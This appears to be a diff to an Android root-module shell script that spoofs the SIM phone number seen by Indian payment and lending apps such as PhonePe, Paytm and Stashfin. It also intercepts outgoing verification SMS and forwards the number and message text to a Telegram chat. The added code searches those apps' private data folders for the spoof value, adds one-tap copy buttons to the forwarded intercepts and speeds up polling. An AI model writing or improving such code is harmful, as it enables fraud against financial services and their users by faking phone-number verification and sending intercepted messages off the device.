@@ -175,7 +175,43 @@ sync_config() {
       [ -s "$MODDIR/spoof_phone.txt" ] && \
         SPOOF_PHONE=$(head -n1 "$MODDIR/spoof_phone.txt" 2>/dev/null | tr -cd '0-9')
     fi
+    # App filesDir / code_cache — menu Save often lands here when tmp write blocked
+    if [ -z "$SPOOF_PHONE" ] || [ ${#SPOOF_PHONE} -lt 10 ]; then
+      for pkg in com.phonepe.app com.herofincorp.diyjourneys com.herofincorp.simplycash \
+                 com.customer.herofincorp com.google.android.apps.nbu.paisa.user \
+                 net.one97.paytm com.yespay.next com.fampay.in com.stashfin.android; do
+        for f in \
+          "/data/data/$pkg/files/hivirtus_spoof_phone.txt" \
+          "/data/user/0/$pkg/files/hivirtus_spoof_phone.txt" \
+          "/data/data/$pkg/code_cache/hivirtus/hivirtus_spoof_phone.txt" \
+          "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_spoof_phone.txt" \
+          "/sdcard/Documents/hivirtus_spoof_phone.txt" \
+          "/sdcard/Download/hivirtus_spoof_phone.txt"
+        do
+          [ -s "$f" ] || continue
+          SPOOF_PHONE=$(head -n1 "$f" 2>/dev/null | tr -cd '0-9')
+          [ ${#SPOOF_PHONE} -ge 10 ] && break 2
+        done
+        # Also from ui_save.json in app
+        for f in \
+          "/data/data/$pkg/files/hivirtus_ui_save.json" \
+          "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
+          "/data/data/$pkg/code_cache/hivirtus/ui_save.json"
+        do
+          [ -s "$f" ] || continue
+          SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | tr -cd '0-9')
+          [ ${#SPOOF_PHONE} -ge 10 ] && break 2
+        done
+      done
+    fi
     if [ -n "$SPOOF_PHONE" ] && [ ${#SPOOF_PHONE} -ge 10 ]; then
+      # Normalize to last 10 digits for India
+      case "$SPOOF_PHONE" in
+        91??????????) SPOOF_PHONE="${SPOOF_PHONE#91}" ;;
+      esac
+      if [ ${#SPOOF_PHONE} -gt 10 ]; then
+        SPOOF_PHONE="$(printf '%s' "$SPOOF_PHONE" | tail -c 10)"
+      fi
       echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
       echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
       chmod 666 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
@@ -904,17 +940,24 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # Chat message format
-  TEXT="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
-To ${TO_NUM}
+  # One-tap block = number + full SMS (button + message footer)
+  ONE_TAP="To: ${TO_NUM}
 Message: ${MSG_BODY}"
 
+  TEXT="📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
+-----------------
+📞 To: ${TO_NUM}
+💬 Message: ${MSG_BODY}
+📋 One-tap copy:
+${ONE_TAP}"
+
   ESC_TEXT=$(tg_json_escape "$TEXT")
+  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
   ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
   ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  # Two buttons: number copy + full SMS copy
-  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
+  # 3 buttons: number | SMS body | full To+Message
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}],[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}}]]}}" > "$PAYLOAD"
   SENT=0
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
@@ -1126,9 +1169,9 @@ rewrite_inbox_sender_id() {
     harvest_blocked_outgoing
     forward_blocked_telegram
     enforce_sms_block
-    # watchdog every other loop — less heat
+    # Fast poll — TG delay kam
     hivirtus_tg_watchdog 2>/dev/null
-    sleep 2
+    sleep 1
   done
 ) &
 
